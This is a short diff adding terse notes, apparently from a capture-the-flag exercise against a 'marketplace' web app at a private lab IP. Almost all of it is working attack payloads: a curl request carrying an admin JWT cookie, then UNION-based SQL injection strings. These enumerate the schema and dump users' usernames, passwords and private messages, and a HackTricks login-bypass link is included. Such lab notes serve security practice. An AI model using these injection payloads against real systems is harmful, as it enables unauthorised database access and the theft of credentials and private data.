@@ -1,0 +1,46 @@
+sql injection
+
+try all
+
+https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass
+
+```
+curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
+http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,database(),3,4"` 
+```
+
+Table identification
+
+```
+10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='marketplace'"`
+```
+
+user  tables columns
+
+```
+10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='users'"`
+```
+
+dump tables
+
+```
+10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(username),3,4 FROM marketplace.users"`
+```
+
+pass
+
+```
+10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(password),3,4 FROM marketplace.users"` 
+```
+
+messages
+
+```
+10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='messages'"`
+```
+
+open messsage
+
+```
+10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages"`
+```
